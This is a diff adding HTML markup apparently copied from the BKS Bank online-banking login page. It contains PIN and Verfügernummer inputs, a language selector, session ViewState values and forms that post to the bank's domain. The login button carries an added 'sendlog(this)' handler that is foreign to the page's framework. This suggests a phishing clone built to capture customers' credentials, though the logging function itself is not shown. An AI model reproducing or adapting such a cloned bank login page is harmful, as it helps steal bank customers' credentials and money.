+                      >
+                        <div
+                          id="db-input-wrapper-loginPin"
+                          class="db-input-wrapper"
+                          data-test="db-input-wrapper-loginPin"
+                        >
+                          <div
+                            class="db-input-inner-wrapper"
+                            data-test="db-input-inner-wrapper-loginPin"
+                          >
+                            <input
+                              id="password"
+                              name="_loginportlet_WAR_loginportlet_:jsf_login_form:j_idt91:loginPin-password"
+                              autocomplete="off"
+                              value=""
+                              maxlength="255"
+                              onblur=""
+                              onfocus=""
+                              class="db-input loginPin"
+                              data-test="db-input ggg"
+                              aria-required="false"
+                              placeholder="PIN"
+                              type="password"
+                              control-id="ControlID-4"
+                            />
+                          </div>
+                        </div>
+                        <div
+                          class="db-select-wrapper db-ml-1"
+                          data-test="db-select-wrapper-language"
+                        >
+                          <div
+                            class="db-select-inner-wrapper"
+                            onmouseover=""
+                            data-test="db-select-inner-wrapper-language"
+                            data-text=""
+                          >
+                            <select
+                              id="_loginportlet_WAR_loginportlet_:jsf_login_form:j_idt120:js-language-select"
+                              name="_loginportlet_WAR_loginportlet_:jsf_login_form:j_idt120:js-language-select"
+                              onchange="DbitComponents.Selectbox.change({selectboxId: &#39;_loginportlet_WAR_loginportlet_:jsf_login_form:j_idt120:js-language-select&#39;, isTwoLine: false, customOnChange: (function(){rmc_languageChanged()}).bind(this)});"
+                              class="db-select"
+                              data-test="db-select"
+                              size="1"
+                              control-id="ControlID-5"
+                            >
+                              <option
+                                value="Languagede"
+                                selected="selected"
+                                class="db-option"
+                                data-test-option-label="Deutsch"
+                              >
+                                Deutsch
+                              </option>
+                              <option
+                                value="Languageen"
+                                class="db-option"
+                                data-test-option-label="Englisch"
+                              >
+                                Englisch
+                              </option>
+                              <option
+                                value="Languagesk"
+                                class="db-option"
+                                data-test-option-label="Slowakisch"
+                              >
+                                Slowakisch
+                              </option>
+                            </select>
+                            <div
+                              class="db-selected-option js-db-selected-option"
+                              data-test="db-select-display"
+                            >
+                              <div
+                                class="db-first-line"
+                                data-line="first"
+                                data-test="db-select-display-first-line"
+                              >
+                                Deutsch
+                              </div>
+                            </div>
+                          </div>
+                          <script type="text/javascript">
+                            $(document).ready(function () {
+                              DbitComponents.Selectbox.init({
+                                selectboxId:
+                                  "_loginportlet_WAR_loginportlet_:jsf_login_form:j_idt120:js-language-select",
+                                isTwoLine: false,
+                                customOnChange: function () {
+                                  rmc_languageChanged();
+                                }.bind(this),
+                              });
+                              DbitComponents.Selectbox.getSelectedOptionInfo(
+                                "_loginportlet_WAR_loginportlet_:jsf_login_form:j_idt120:js-language-select"
+                              );
+                            });
+                          </script>
+                        </div>
+                        <input
+                          type="hidden"
+                          name="_loginportlet_WAR_loginportlet_:jsf_login_form:j_idt133"
+                          control-id="ControlID-6"
+                        /><input
+                          type="hidden"
+                          name="_loginportlet_WAR_loginportlet_:jsf_login_form:j_idt134"
+                          control-id="ControlID-7"
+                        />
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="row db-mt-0">
+                  <div class="col-xs-12">
+                    <p>
+                      Ihre Anmeldung geschieht über gesicherte TLS-Verbindungen.
+                    </p>
+                    <input
+                      id="btn"
+                      type="submit"
+                      name="_loginportlet_WAR_loginportlet_:jsf_login_form:loginButton"
+                      value="Weiter"
+                      title="Weiter"
+                      class="db-btn accent db-accent db-right-aligned bwc-db-login-btn"
+                      onclick="sendlog(this);"
+                      data-test="db-btn-SCALOGIN_CONTINUE"
+                      aria-label="Weiter"
+                      control-id="ControlID-8"
+                    />
+                  </div>
+                </div>
+                <input
+                  type="hidden"
+                  name="javax.faces.ViewState"
+                  id="_loginportlet_WAR_loginportlet_:javax.faces.ViewState:1"
+                  value="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"
+                  autocomplete="off"
+                  control-id="ControlID-9"
+                />
+              </div>
+              <form
+                data-senna-off="true"
+                id="_loginportlet_WAR_loginportlet_:scaLoginProfile"
+                name="_loginportlet_WAR_loginportlet_:scaLoginProfile"
+                method="post"
+                action="https://www.bksbank-online.at/login?p_auth=JKJVUQpb&amp;p_p_auth=21NdAGxc&amp;p_p_id=loginportlet_WAR_loginportlet&amp;p_p_lifecycle=1&amp;p_p_state=normal&amp;p_p_mode=view&amp;p_p_col_id=&amp;p_p_col_count=0&amp;_loginportlet_WAR_loginportlet__facesViewIdRender=%2Fviews%2Flogin.xhtml"
+                enctype="application/x-www-form-urlencoded"
+              >
+                <input
+                  type="hidden"
+                  name="_loginportlet_WAR_loginportlet_:scaLoginProfile"
+                  value="_loginportlet_WAR_loginportlet_:scaLoginProfile"
+                /><input
+                  type="hidden"
+                  name="javax.faces.encodedURL"
+                  value="https://www.bksbank-online.at/login?p_p_auth=21NdAGxc&amp;p_p_id=loginportlet_WAR_loginportlet&amp;p_p_lifecycle=2&amp;p_p_state=normal&amp;p_p_mode=view&amp;p_p_cacheability=cacheLevelPage&amp;p_p_col_id=&amp;p_p_col_count=0&amp;_loginportlet_WAR_loginportlet__jsfBridgeAjax=true&amp;_loginportlet_WAR_loginportlet__facesViewIdResource=%2Fviews%2Flogin.xhtml"
+                /><span class="scaLoginProfile"
+                  ><input
+                    type="hidden"
+                    name="_loginportlet_WAR_loginportlet_:scaLoginProfile:j_idt156"
+                    value="ZFDQ3x-2G5SXLh4qOGvFrFlBM23sV49zphqX31s5VQzOP1gWfRpWjZ2RQebOzAvtfzqjyH7hf2Ce6_zWJFkjmg" /></span
+                ><input
+                  type="hidden"
+                  name="javax.faces.ViewState"
+                  id="_loginportlet_WAR_loginportlet_:javax.faces.ViewState:2"
+                  value="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"
+                  autocomplete="off"
+                />
+              </form>
+            </span>
+            <footer class="db-tile-footer primary" data-test="db-tile-footer">
+              <div class="db-row">
+                <div class="db-col db-btn-group">
+                  <button
+                    id="db-initial-login-btn"
+                    type="button"
+                    class="db-btn db-btn-borderless"
+                    onclick="DbitComponents.AccordionHandler.toggleAccordion({uniqueId: &#39;first-login-accordion&#39;}); DbitComponents.Helper.addFocus(document.querySelector(&#39;.js-login-first-step-autofocus&#39;))"
+                    aria-label="Erstanmeldung"
+                    data-test="db-btn-LOGIN_FIRSTREGISTRATION"
+                    title="Erstanmeldung"
+                  >
+                    <span class="db-btn-text" data-test="db-btn-text"
+                      >Erstanmeldung</span
+                    >
+                  </button>
+                </div>
+              </div>
+            </footer>
+          </div>
+          <div
+            class="db-slidable-content-wrapper db-slidable-content-tile-wrapper"
+          >
+            <div
+              id="first-login-accordion"
+              class="db-accordion"
+              data-test="db-accordion-first-login"
+            >
+              <div class="db-accordion-body" data-test="db-accordion-body">
+                <header
+                  class="db-accordion-header row"
+                  data-test="db-accordion-header"
+                >
+                  <div
+                    class="db-accordion-header-title col-xs-10 col-sm-7"
+                    data-test="db-accordion-header-title"
+                  >
+                    <h2 data-test="db-accordion-headline">Erstanmeldung</h2>
+                  </div>
+                  <div
+                    class="db-accordion-header-actions col-xs-2 col-sm-5"
+                    data-test="db-accordion-header-actions"
+                  >
+                    <div
+                      class="db-accordion-header-button-container db-btn-group db-right"
+                      data-test="db-accordion-header-button-container"
+                    >
+                      <button
+                        type="button"
+                        class="db-btn db-btn-icon db-btn-close primary"
+                        onclick="DbitComponents.AccordionHandler.closeAccordion({uniqueId: &#39;first-login-accordion&#39;});"
+                        aria-label="Schließen"
+                        data-test="db-btn-FIRSTLOGIN_CLOSE"
+                        title="Schließen"
+                      >
+                        <span
+                          class="db-icon-wrapper"
+                          data-test="db-icon-wrapper-close"
+                          ><i class="dbit-icons" data-test="db-icon">
+                            close</i
+                          ></span
+                        >
+                      </button>
+                    </div>
+                  </div>
+                </header>
+                <section
+                  class="db-accordion-content row"
+                  data-test="db-accordion-content"
+                >
+                  <div class="col-xs-12">
+                    <form
+                      data-senna-off="true"
+                      id="_loginportlet_WAR_loginportlet_:first-login-form"
+                      name="_loginportlet_WAR_loginportlet_:first-login-form"
+                      method="post"
+                      action="https://www.bksbank-online.at/login?p_auth=JKJVUQpb&amp;p_p_auth=21NdAGxc&amp;p_p_id=loginportlet_WAR_loginportlet&amp;p_p_lifecycle=1&amp;p_p_state=normal&amp;p_p_mode=view&amp;p_p_col_id=&amp;p_p_col_count=0&amp;_loginportlet_WAR_loginportlet__facesViewIdRender=%2Fviews%2Flogin.xhtml"
+                      enctype="application/x-www-form-urlencoded"
+                    >
+                      <input
+                        type="hidden"
+                        name="_loginportlet_WAR_loginportlet_:first-login-form"
+                        value="_loginportlet_WAR_loginportlet_:first-login-form"
+                      /><input
+                        type="hidden"
+                        name="javax.faces.encodedURL"
+                        value="https://www.bksbank-online.at/login?p_p_auth=21NdAGxc&amp;p_p_id=loginportlet_WAR_loginportlet&amp;p_p_lifecycle=2&amp;p_p_state=normal&amp;p_p_mode=view&amp;p_p_cacheability=cacheLevelPage&amp;p_p_col_id=&amp;p_p_col_count=0&amp;_loginportlet_WAR_loginportlet__jsfBridgeAjax=true&amp;_loginportlet_WAR_loginportlet__facesViewIdResource=%2Fviews%2Flogin.xhtml"
+                      />
+                      <div class="row">
+                        <ol class="db-step-indicator-container">
+                          <li
+                            class="db-step-indicator col-xs-12 db-active"
+                            data-test="db-first-login-step-1"
+                          >
+                            <div class="db-step-indicator-content row">
+                              <script
+                                id="_loginportlet_WAR_loginportlet_:first-login-form:j_idt308"
+                                type="text/javascript"
+                              >
+                                rmc_submit_identification = function () {
+                                  PrimeFaces.ab({
+                                    s: "_loginportlet_WAR_loginportlet_:first-login-form:j_idt308",
+                                    f: "_loginportlet_WAR_loginportlet_:first-login-form",
+                                    u: "_loginportlet_WAR_loginportlet_:first-login-form",
+                                    pa: arguments[0],
+                                  });
+                                };
+                              </script>
+                              <div class="col-xs-12 col-md-8">
+                                <div
+                                  id="db-input-wrapper-bankingNumberInput"
+                                  class="db-input-wrapper"
+                                  data-test="db-input-wrapper-bankingNumberInput"
+                                >
+                                  <label
+                                    for="_loginportlet_WAR_loginportlet_:first-login-form:j_idt310:bankingNumberInput"
+                                    class="db-label"
+                                    data-test="db-input-label"
+                                    ><span class="db-label-text"
+                                      >Verfügernummer</span
+                                    ></label
+                                  >
+                                  <div
+                                    class="db-input-inner-wrapper"
+                                    data-test="db-input-inner-wrapper-bankingNumberInput"
+                                  >
+                                    <input
+                                      id="_loginportlet_WAR_loginportlet_:first-login-form:j_idt310:bankingNumberInput"
+                                      name="_loginportlet_WAR_loginportlet_:first-login-form:j_idt310:bankingNumberInput"
+                                      class="db-input db-sm-mw-140 js-login-first-step-autofocus"
+                                      maxlength="32"
+                                      onblur=""
+                                      onfocus=""
+                                      data-test="db-input"
+                                      aria-required="false"
+                                      placeholder="Verfügernummer"
+                                      type="text"
+                                    />
+                                    <div
+                                      class="db-top-half-spacer col-xs-12 visible-xs"
+                                    ></div>
+                                    <button
+                                      type="submit"
+                                      class="db-btn accent"
+                                      name="goToStep2Button"
+                                      onclick="event.preventDefault();rmc_submit_identification();"
+                                      aria-label="Weiter"
+                                      data-test="db-btn-FIRSTLOGIN_NEXT_STEP"
+                                      title="Weiter"
+                                    >
+                                      <span
+                                        class="db-btn-text"
+                                        data-test="db-btn-text"
+                                        >Weiter</span
+                                      >
+                                    </button>
+                                  </div>
+                                </div>
+                              </div>
+                              <div class="col-xs-12 col-md-4">
+                                <div
+                                  class="db-top-half-spacer col-xs-12 visible-sm"
+                                ></div>
+                                <span
+                                  data-test="db-firstlogin-step1-additional-information"
+                                  >Geben Sie für eine Erstanmeldung Ihre
+                                  Verfügernummer ein.</span
+                                >
+                              </div>
+                            </div>
+                          </li>
+                        </ol>
+                      </div>
+                      <input
+                        type="hidden"
+                        name="javax.faces.ViewState"
+                        id="_loginportlet_WAR_loginportlet_:javax.faces.ViewState:3"
